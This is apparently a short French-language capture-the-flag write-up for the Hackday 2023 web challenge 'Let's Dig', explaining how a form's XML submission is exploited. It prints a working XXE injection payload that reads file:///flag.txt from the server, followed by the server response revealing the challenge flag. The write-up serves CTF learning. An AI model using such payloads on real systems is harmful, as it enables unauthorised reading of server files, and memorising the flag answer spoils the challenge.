---
layout: post
title: Hackday_2023 - Let's Dig
date: 2023-03-21 21:51 +0100
categories: Web
---

## Let's dig

https://7fcf29753d2.hackday.fr <br>
https://7fcf29753d2.hackday.fr/process.php


Le flag se trouve à la racine dans un fichier flag.txt. on remarque vite un questionnaire et un fichier js qui envoie un xml des réponses au serveur.
Pour récupérer le flag il faut faire une injection xxe en modifiant l'envoie du formulaire.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<root><name>
&xxe;</name><tel>fds</tel><email>eee
</email></root>
```

flag : 

```bash
Thank you 
HACKDAY{62e2eeae3d450e008bd353f57f4be401}
, you're successfully registered
```
